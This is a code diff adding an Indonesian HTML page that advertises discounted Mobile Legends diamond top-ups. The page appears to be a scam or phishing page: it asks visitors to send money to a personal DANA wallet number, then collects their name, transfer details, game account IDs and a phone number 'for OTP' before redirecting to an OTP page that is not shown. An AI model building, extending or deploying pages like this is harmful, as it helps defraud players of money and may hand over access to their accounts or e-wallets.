@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Top Up MLBB Diskon</title>
+<style>
+  /* Background + Watermark */
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: radial-gradient(1200px 800px at 10% -10%, #19345e 0%, transparent 50%),
+                radial-gradient(1200px 800px at 100% 0%, #12243f 0%, transparent 50%),
+                #0b1220;
+    color: #fff;
+  }
+  .watermark::before {
+    content: "MOBILE LEGENDS BANG BANG";
+    position: fixed;
+    inset: 0;
+    display: grid;
+    place-items: center;
+    font-weight: 900;
+    font-size: clamp(3rem, 12vw, 10rem);
+    letter-spacing: 0.2em;
+    color: transparent;
+    -webkit-text-stroke: 2px rgba(255,255,255,0.05);
+    text-stroke: 2px rgba(255,255,255,0.05);
+    transform: rotate(-12deg) scale(1.2);
+    pointer-events: none;
+    user-select: none;
+  }
+  h1 {
+    text-align: center;
+    padding: 20px;
+    margin: 0;
+    font-size: 1.8rem;
+    background: linear-gradient(to right, #FFD700, #FF8C00);
+    color: #000;
+    font-weight: bold;
+  }
+  .wrap {
+    max-width: 650px;
+    margin: auto;
+    padding: 20px;
+  }
+
+  /* Paket Card */
+  .paket-card {
+    background: linear-gradient(145deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 15px;
+    padding: 15px;
+    margin-bottom: 15px;
+    text-align: center;
+    box-shadow: 0 0 15px rgba(30,144,255,0.3);
+  }
+  .paket-card h2 {
+    margin: 0;
+    font-size: 1.2rem;
+    color: #1e90ff;
+  }
+  .paket-card p {
+    margin: 5px 0;
+    font-size: 0.95rem;
+  }
+  select, input {
+    width: 100%;
+    padding: 10px;
+    border-radius: 8px;
+    border: none;
+    margin-top: 5px;
+    background: #121a2b;
+    color: #fff;
+    font-size: 0.95rem;
+  }
+
+  /* Pembayaran Card */
+  .pay-card {
+    background: #1a2337;
+    padding: 15px;
+    border-radius: 15px;
+    margin-bottom: 20px;
+    border: 2px solid #FFD700;
+    box-shadow: 0 0 20px rgba(255,215,0,0.5);
+  }
+  .pay-card h3 {
+    margin: 0;
+    color: #FFD700;
+    font-size: 1.2rem;
+  }
+  .dana-number {
+    font-size: 1.3rem;
+    font-weight: bold;
+    margin: 10px 0;
+    color: #00d4ff;
+  }
+  .btn-copy {
+    background: linear-gradient(to right, #FFD700, #FFA500);
+    color: #000;
+    font-weight: bold;
+    padding: 8px 12px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+  .btn-copy:hover {
+    opacity: 0.9;
+  }
+
+  /* Tombol Kirim */
+  button {
+    margin-top: 15px;
+    padding: 12px;
+    width: 100%;
+    border-radius: 8px;
+    border: none;
+    background: linear-gradient(to right, #1e90ff, #00d4ff);
+    color: #fff;
+    font-weight: bold;
+    font-size: 1rem;
+    cursor: pointer;
+  }
+  button:hover {
+    opacity: 0.9;
+  }
+</style>
+</head>
+<body class="watermark">
+<h1>TOP UP DIAMOND MLBB DISKON</h1>
+<div class="wrap">
+
+  <!-- Pilih Paket -->
+  <div class="paket-card">
+    <h2>Pilih Paket Diamond</h2>
+    <select id="paket">
+      <option value="20K – 275 Diamond">Rp 20.000 – 275 Diamond</option>
+      <option value="35K – 515 Diamond">Rp 35.000 – 515 Diamond</option>
+      <option value="55K – 725 Diamond (Promo)">Rp 55.000 – 725 Diamond (Promo)</option>
+    </select>
+  </div>
+
+  <!-- Form Data -->
+  <label>Nama Pengirim</label>
+  <input type="text" id="namaPengirim">
+
+  <label>Nominal Transfer</label>
+  <input type="number" id="nominal">
+
+  <label>ID Transaksi / Catatan</label>
+  <input type="text" id="idTransaksi">
+
+  <label>ID Game Mobile Legends</label>
+  <input type="text" id="idGame">
+
+  <label>ID Server Mobile Legends</label>
+  <input type="text" id="idServer">
+
+  <label>Nomor HP Aktif (untuk OTP)</label>
+  <input type="text" id="noHP">
+
+  <!-- Metode Pembayaran -->
+  <div class="pay-card">
+    <h3>Metode Pembayaran via DANA</h3>
+    <div>Transfer ke nomor:</div>
+    <div class="dana-number" id="nomorDana">083869365527</div>
+    <button class="btn-copy" onclick="copyDana()">Salin Nomor</button>
+    <p style="margin-top:10px; font-size:0.85rem; color:#ccc;">
+      Setelah transfer, klik "Kirim & Dapatkan OTP" untuk melanjutkan.
+    </p>
+  </div>
+
+  <button onclick="kirimData()">Kirim & Dapatkan OTP</button>
+</div>
+
+<script>
+function copyDana(){
+  const n = document.getElementById('nomorDana').textContent.trim();
+  navigator.clipboard.writeText(n).then(()=>{
+    alert('Nomor DANA tersalin: '+n);
+  }, ()=>{
+    prompt('Salin manual nomor berikut:', n);
+  });
+}
+
+function kirimData(){
+  const data = {
+    paket: document.getElementById('paket').value,
+    namaPengirim: document.getElementById('namaPengirim').value.trim(),
+    nominal: document.getElementById('nominal').value.trim(),
+    idTransaksi: document.getElementById('idTransaksi').value.trim(),
+    idGame: document.getElementById('idGame').value.trim(),
+    idServer: document.getElementById('idServer').value.trim(),
+    noHP: document.getElementById('noHP').value.trim()
+  };
+  for(let key in data){ if(!data[key]) return alert("Mohon lengkapi semua data!"); }
+  localStorage.setItem("mlbb_data", JSON.stringify(data));
+  alert("Kode OTP akan dikirim ke nomor: " + data.noHP);
+  window.location.href = "otp.html";
+}
+</script>
+</body>
+</html>
